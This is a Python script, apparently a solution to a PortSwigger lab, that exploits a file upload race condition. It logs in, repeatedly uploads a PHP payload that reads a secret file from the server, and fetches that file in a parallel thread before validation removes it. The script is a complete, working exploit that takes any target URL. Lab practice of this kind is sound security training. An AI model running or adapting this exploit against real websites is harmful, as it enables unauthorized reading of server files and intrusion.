#!/usr/bin/env python3

# Lab: https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-race-condition

# Exploiting a file upload race condition. The uploaded file is stored in an accessible location before being removed if it fails validation.

import sys
import requests
from bs4 import BeautifulSoup
from threading import Thread

USER = "wiener"
PASS = "peter"

def upload(target):
	global done
	s = requests.Session()

	login_url = f'{target}/login'

	# Get login CSRF token
	bs = BeautifulSoup(s.get(login_url).content, features='lxml')
	csrftoken = bs.find('input', {"name":"csrf"})['value']

	# Login
	login_data = {"csrf":csrftoken, "username":USER, "password":PASS}
	bs = BeautifulSoup(s.post(login_url, data=login_data).content, features='lxml')
	csrftoken = bs.find('input', {"name":"csrf"})['value']

	payload = {
		'avatar': ('payload.php', '<?php echo file_get_contents("/home/carlos/secret");?>'),
		'user': (None, USER),
		'csrf': (None, csrftoken)
	}

	# Upload file
	while not done:
		r = s.post(f'{target}/my-account/avatar', files=payload)

	print(f'[+] Stopped uploading.')

def request(target):
	s = requests.Session()
	# Request file
	while True:
		r = s.get(f'{target}/files/avatars/payload.php')
		print(f'[Requesting]: {r.status_code}')
		if  r.status_code != 404:
			print(f'[+] Got it! ')
			print(f'[+] Response content: {r.text}')
			break

def main(target):
	global done
	uploader = Thread(target=upload, args=(target,))
	uploader.daemon = True
	racer = Thread(target=request, args=(target,))
	racer.daemon = True

	# Start requesting the uploaded file
	racer.start()
	done = False
	# Start uploading the file
	uploader.start()
	# Wait for racer to win the race condition
	racer.join()
	done = True
	uploader.join()
	print(f'[+] Bye.')

if __name__ == '__main__':
	if len(sys.argv) != 2:
		print(f'Usage: {sys.argv[0]} <https://target-url>')
		sys.exit(1)
	main(sys.argv[1].strip('/'))
